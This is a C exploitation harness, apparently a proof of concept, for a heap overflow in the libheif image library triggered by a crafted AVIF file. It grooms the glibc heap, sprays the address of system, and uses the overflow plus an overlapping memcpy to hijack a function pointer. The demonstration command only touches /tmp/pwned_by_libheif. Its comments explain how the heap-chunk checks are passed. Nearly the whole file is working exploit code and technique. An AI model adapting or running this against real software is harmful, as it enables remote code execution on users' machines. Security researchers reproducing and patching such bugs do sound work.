#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <dlfcn.h>
#include <libheif/heif.h>

/*
 * Two-stage exploitation harness for the libheif duplicate-Alpha overflow.
 *
 * Stage 1 (the overflow, inside libheif):
 *   - window bytes 8..15 craft the target chunk SIZE field to 0x10001 so
 *     free(alpha) passes glibc's prev_inuse / next-size checks and the
 *     clear-inuse write lands harmlessly in the guard chunk
 *   - window bytes 48..51 overwrite Target.len (uint32 at OFP) with 0x1000
 *     (written u16 values are the right-aligned 12-bit plane samples, so a
 *     32-bit field gets bytes [<=0xf, full, <=0xf, full])
 *
 * Stage 2 (harness, standing in for the app's post-decode processing):
 *   - memcpy(buf, buf+8, len) propagates buf[i+8] -> buf[i]; the 8 bytes at
 *     fp+8 (the "spray", attacker-controlled heap content in a real attack)
 *     land on the function pointer; calling fp(arg) runs system(cmd)
 *
 * Modes:
 *   0 = no grooming (baseline abort)
 *   1 = exploit
 *   2 = calibration dump of the first 128 target bytes
 * argv[3..] = hole sizes in free order (see driver.py / holes.txt)
 */

#define OFP          32       /* Target.len lives here (window offset 48) */
#define TARGET_SZ    65504

struct Target {
    uint8_t pad[OFP];
    uint32_t len;             /* inflated to 0x1000 by the overflow */
    uint8_t buf[1024];        /* stage-2 memcpy source */
    void (*fp)(const char*);  /* receives buf[fp_delta+8..] via the copy */
    uint8_t spray[64];        /* fp+8: sprayed with the system address */
} __attribute__((aligned(16)));

static void* holes[128];
static size_t hole_sizes[128];
static int n_holes = 0;

int main(int argc, char** argv)
{
    int mode = argc > 1 ? atoi(argv[1]) : 0;
    const char* file = argc > 2 ? argv[2] : "/src/payload.avif";
    for (int i = 3; i < argc; i++)
        hole_sizes[n_holes++] = (size_t)strtoul(argv[i], NULL, 0);

    struct Target* t = NULL;

    if (mode >= 1) {
        holes[0] = malloc(hole_sizes[0]);
        t = (struct Target*)malloc(sizeof(struct Target));
        memset(t, 0x41, sizeof(struct Target));
        for (int i = 1; i < n_holes; i++) {
            void* g = malloc(64);
            holes[i] = malloc(hole_sizes[i]);
            (void)g;
        }
        for (int i = 0; i < n_holes; i++)
            free(holes[i]);

        /* benign defaults (stage 2 will corrupt len) */
        t->len = 64;
        memset(t->buf, 0x01, sizeof(t->buf)); /* bit0 set: keeps glibc forward-consolidation path from unlinking */
        t->fp = (void (*)(const char*))&puts;

        /* spray: the system address right above fp, 8 bytes ahead of it so
         * that memcpy(buf, buf+8, len) moves it onto fp */
        void* sysaddr = dlsym(RTLD_DEFAULT, "system");
        memcpy(t->spray, &sysaddr, sizeof(sysaddr));

    }

    fprintf(stderr, "[*] target=%p len@%p fp=%p spray=%p system=%p\n",
           (void*)t, t ? (void*)&t->len : NULL,
           t ? (void*)&t->fp : NULL, t ? (void*)t->spray : NULL,
           (void*)dlsym(RTLD_DEFAULT, "system"));

    struct heif_context* ctx = heif_context_alloc();
    if (heif_context_read_from_file(ctx, file, NULL).code != 0) {
        fprintf(stderr, "failed to read file\n");
        return 1;
    }

    struct heif_image_handle* handle = NULL;
    heif_context_get_primary_image_handle(ctx, &handle);

    struct heif_image* img = NULL;
    struct heif_error err = heif_decode_image(handle, &img,
                                              heif_colorspace_YCbCr,
                                              heif_chroma_420, NULL);
    if (err.code != 0) {
        fprintf(stderr, "decode error: %s\n", err.message);
        return 1;
    }

    fprintf(stderr, "[*] after decode: len=0x%x fp=%p\n", t->len, (void*)t->fp);

    if (mode == 2) {
        unsigned char* p = (unsigned char*)t;
        for (int i = 0; i < 128; i += 16) {
            printf("[dump %03d] ", i);
            for (int j = 0; j < 16; j++)
                printf("%02x ", p[i + j]);
            printf("\n");
        }
        _exit(0);
    }

    /* stage 2: overlapping forward copy -> fp = spray.
     * The command string lives on the stack: the copy range covers target
     * offsets 36..3875, so anything in the struct below offset ~3900 gets
     * clobbered before fp is called. */
    char cmd[64];
    snprintf(cmd, sizeof(cmd), "touch /tmp/pwned_by_libheif");
    memcpy(t->buf, t->buf + 8, t->len);
    fprintf(stderr, "[*] after copy: fp=%p\n", (void*)t->fp);
    t->fp(cmd);
    fprintf(stderr, "[*] fp returned\n");
    _exit(0);
}
